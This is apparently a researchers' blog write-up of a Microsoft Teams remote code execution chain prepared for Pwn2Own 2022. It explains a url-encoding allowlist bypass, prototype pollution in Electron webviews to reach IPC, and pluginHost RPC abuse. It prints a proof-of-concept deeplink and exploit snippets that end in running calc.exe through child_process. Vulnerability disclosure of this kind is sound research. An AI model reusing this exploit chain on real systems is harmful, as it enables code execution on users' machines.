---
layout: post
title:  "2022 Microsoft Teams RCE"
date:   2023-01-17 00:18:20 +0900
---

Me [(@adm1nkyj1)](https://twitter.com/adm1nkyj1) and jinmo123 of theori[(@jinmo123)](https://twitter.com/jinmo123) participated pwn2own 2022 vancouver but we failed because of time allocation issue

but our bug and the exploit was really cool so decided to share on blog!

### Executive Summary

The deeplink handler for /l/task/:appId in Microsoft Teams can load an arbitrary url in webview/iframe.
Attacker can leaverage this with teams RPC's functionality to get code execution outside the sandbox.

#### 1. URL allowlist bypass using url encoding

In Microsoft Teams, there is a handler for /l/task/:appId which accepts `url` as a parameter.
This allows bots created by Teams applications to send a link to user, which should be in the url allowlist.

The allowlist is constructed from various fields of app definition:

```js
    a = angular.isDefined(e.validDomains) ? _.clone(e.validDomains) : [];
return e.galleryTabs && a.push.apply(a, _.map(e.galleryTabs, function (e) {
    return i.getValidDomainFromUrl(e.configurationUrl)
})), e.staticTabs && a.push.apply(a, _.map(e.staticTabs, function (e) {
    return i.getValidDomainFromUrl(e.contentUrl)
})), e.connectors && a.push.apply(a, _.map(e.connectors, function (e) {
    return i.utilityService.parseUrl(e.configurationUrl).host
```

These domains are converted into regular expressions, and are used to validate the url:

```js
t.prototype.isUrlInDomainList = function(e, t, n) {
    void 0 === n && (n = !1);
    for (var i = n ? e : this.parseUrl(e).href, s = 0; s < t.length; s++) {
        for (var a = "", r = t[s].split("."), o = 0; o < r.length; o++)
            a += (o > 0 ? "[.]" : "") + r[o].replace("*", "[^/^.]+");
        var c = new RegExp("^https://" + a + "((/|\\?).*)?$","i");
        if (e.match(c) || i.match(c))
            return !0
    }
    return !1
}
```

Regardless of the third parameter `n`, if the original url matches the given regular expression, this check is passed.
After checking the url, instead, the parsed form (parseUrl) is passed to webview.

```js
e.prototype.setContainerUrl = function(e) {
    var t = this;
    this.sdkWindowMessageHandler && (this.sdkWindowMessageHandler.destroy(),
    this.sdkWindowMessageHandler = null);
    var n = this.utilityService.parseUrl(e);
    this.$q.when(this.htmlSanitizer.sanitizeUrl(n.href, ["https"])).then(function(e) {
        t.frameSrc = e
    })
}
```

This is problematic because `parseUrl` of utilityService url-decodes the url; the check is done on the original, url-encoded url.
Especially,
when an allowlisted domain contains wildcard e.g. `*.office.com`, the generated regular expression is `/^https://[^/^.]+[.]office[.]com((/|\?).*)?$/i`.
The wildcard becomes `[^/^.]+`, but if the given url is `https://attacker.com%23.office.com`, the check is passed. However, after decoding the url, this becomes `https://attacker.com#.office.com`, which loads `attacker.com` instead.

`Microsoft Planner` app (appId: 1ded03cb-ece5-4e7c-9f73-61c375528078) has a domain with wildcard in its validDomains field:

```js
{
    "manifestVersion": "1.7",
    "version": "0.0.19",
    "categories": [
        "Microsoft",
        "Productivity",
        "ProjectManagement"
    ],
    "disabledScopes": [
        "PrivateChannel"
    ],
    "developerName": "Microsoft Corporation",
    "developerUrl": "https://tasks.office.com",
    "privacyUrl": "https://privacy.microsoft.com/privacystatement",
    "termsOfUseUrl": "https://www.microsoft.com/servicesagreement",
    "validDomains": [
        "tasks.teams.microsoft.com",
        "retailservices.teams.microsoft.com",
        "retailservices-ppe.teams.microsoft.com",
        "tasks.office.com",
        "*.office.com"
    ],
...
}
```

As a result, this bug allows the attacker to load an arbitrary location into a webview.

PoC:  
`https://teams.live.com/_#/l/task/1ded03cb-ece5-4e7c-9f73-61c375528078?url=https://attacker.com%23.office.com/&height=100&width=100&title=hey&fallbackURL=https://aka.ms/hey&completionBotId=1&fqdn=teams.live.com`

#### 2. pluginHost allows dangerous RPC calls from any webview

Since `contextIsolation` is not enabled on the webview, attacker can leverage prototype pollution to invoke arbitrary electron IPC calls to processes (see Appendix section).

Given this primitive, attacker can invoke `'calling:teams:ipc:initPluginHost'` IPC call of main process,
which gives the id of the pluginHost window.

pluginHost exposes dangerous RPC calls to any webview e.g. returning a member of 'registered objects', calling them, and importing some allowlisted modules.

lib/pluginhost/preload.js:

```js
// n, o is controllable
P(c.remoteServerMemberGet, (e, t, n, o) => {
  const i = s.objectsRegistry.get(n);
  if (null == i)
    throw new Error(
      `Cannot get property '${o}' on missing remote object ${n}`
    );
  return A(e, t, () => i[o]);
}),

// n, o, i is controllable
P(c.remoteServerMemberCall, (e, t, n, o, i) => {
  i = v(e, t, i);
  const r = s.objectsRegistry.get(n);
  if (null == r)
    throw new Error(
      `Cannot call function '${o}' on missing remote object ${n}`
    );
  return A(e, t, () => r[o](...i));
}),
```

Attacker can get the constructor of any objects, and the constructor of the constructor (Function) to compile arbitrary JavaScript code,
and call the compiled function.

```js
[_,pluginHost]=ipc.sendSync('calling:teams:ipc:initPluginHost', []);
msg=ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_MEMBER_GET', [{hey: 1}, 1, 'constructor', []], '')[0].id
msg=ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_MEMBER_CALL', [{hey: 1}, msg, 'constructor', [{type: 'value', value: 'alert()'}]], '')[0].id
```

`require()` is not exposed to the script itself, but the attacker-controlled script can overwrite prototype of String, which is useful in this code:

```js
function loadSlimCore(slimcoreLibPath) {
let slimcore;
if (utility.isWebpackRuntime()) {
  const slimcoreLibPathWebpack = slimcoreLibPath.replace(/\\/g, "\\\\");
  slimcore = eval(`require('${slimcoreLibPathWebpack}')`);
...
}
...
function requireEx(e, t) {
...
const { slimCoreLibPath: n, error: o } =
  electron_1.ipcRenderer.sendSync(
    constants.events.calling.getSlimCoreLibInfo
  );
if (o) throw new Error(o);
if (t === n) return loadSlimCore(n);
// n === 'slimcore'
throw new Error("Invalid module: " + t);
}

// y === requireEx
P(c.remoteServerRequire, (e, t, n) => A(e, t, () => y(e, n))),
```

If the attacker calls remoteServerRequire with `'slimcore'` as an argument, the pluginHost evaluates string returned by `String.prototype.replace`.
Therefore, the following code can invoke require with arbitrary arguments, and call methods in the module.

```js
msg=ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_MEMBER_CALL', [{hey: 1}, msg, 'constructor', [{type: 'value', value: 'var backup=String.prototype.replace; String.prototype.replace = ()=>"slimcore\');require(`child_process`).exec(`calc.exe`);(\'";'}]], '')[0].id
ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_FUNCTION_CALL', [{hey: 1}, msg, []], '')
ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_REQUIRE', [{hey: 1}, 'slimcore'], '')
```

By using `child_process` module, attacker can execute any program.

#### Appendix A: Accessing any bundled modules when contextIsolation is not enabled between preload script and web pages

Electron compiles and executes a script named `sandbox_bundle.js` in every sandboxed frame, and it registers a handler that shows security warnings if user wants.

To enable the security warning, users can set `ELECTRON_ENABLE_SECURITY_WARNINGS` either in environment variables or `window`.

lib/renderer/security-warnings.ts#L43-L46:

```js
  if ((env && env.ELECTRON_ENABLE_SECURITY_WARNINGS) ||
      (window && window.ELECTRON_ENABLE_SECURITY_WARNINGS)) {
    shouldLog = true;
  }
```

This is called on 'load' event of the window:

```js
export function securityWarnings (nodeIntegration: boolean) {
  const loadHandler = async function () {
    if (shouldLogSecurityWarnings()) {
      const webPreferences = await getWebPreferences();
      logSecurityWarnings(webPreferences, nodeIntegration);
    }
  };
  window.addEventListener('load', loadHandler, { once: true });
}
```

security-warnings.ts is also bundled to `sandbox_bundle.js` using webpack. There is an import of `webFrame`, which lazily loads the "./lib/renderer/api/web-frame.ts".

```js
import { webFrame } from 'electron';
...
const isUnsafeEvalEnabled = () => {
  return webFrame._isEvalAllowed();
};
// this is called by warnAboutInsecureCSP + logSecurityWarnings
```

This is done by electron.ts:

```typescript
import { defineProperties } from '@electron/internal/common/define-properties';
import { moduleList } from '@electron/internal/sandboxed_renderer/api/module-list';

module.exports = {};

defineProperties(module.exports, moduleList);
```

In define-properties.ts, it defines getter for all modules in `moduleList`; `loader` is invoked when a module e.g. webFrame is accessed.

```typescript
const handleESModule = (loader: ElectronInternal.ModuleLoader) => () => {
  const value = loader();
  if (value.__esModule && value.default) return value.default;
  return value;
};

// Attaches properties to |targetExports|.
export function defineProperties (targetExports: Object, moduleList: ElectronInternal.ModuleEntry[]) {
  const descriptors: PropertyDescriptorMap = {};
  for (const module of moduleList) {
    descriptors[module.name] = {
      enumerable: !module.private,
      get: handleESModule(module.loader)
    };
  }
  return Object.defineProperties(targetExports, descriptors);
}
```

The loader for webFrame is defined in the moduleList:

```typescript
export const moduleList: ElectronInternal.ModuleEntry[] = [
  {
...
  {
    name: 'webFrame',
    loader: () => require('@electron/internal/renderer/api/web-frame')
  },
```

Which is compiled as:
```js
}, {
    name: "webFrame",
    loader: ()=>r(/*! @electron/internal/renderer/api/web-frame */
    "./lib/renderer/api/web-frame.ts")
}, {
```

The function `r` above is `__webpack_require__`, which actually loads the module if not loaded yet.

```js
function __webpack_require__(r) {
    if (t[r])
        return t[r].exports;
```

Here, `t` is the list of cached modules. If the module is not loaded by any code, `t[r]` is undefined. Also, `t.__proto__` points Object.prototype, so attacker can install getter for the module path to get the whole list of cached modules.

```js
const KEY = './lib/renderer/api/web-frame.ts';
let modules;
Object.prototype.__defineGetter__(KEY, function () {
    console.log(this);
    modules = this;
    delete Object.prototype[KEY];
    main();
})
```

This enables attacker to get the `@electron/internal/renderer/api/ipc-renderer` module to send any IPCs to any processes.

```js
var ipc = modules['./lib/renderer/api/ipc-renderer.ts'].exports.default;
[_, pluginHost] = ipc.sendSync('calling:teams:ipc:initPluginHost', []);
```

We utilized this to send IPC to pluginHost (see Section 2), and execute a program outside the sandbox.
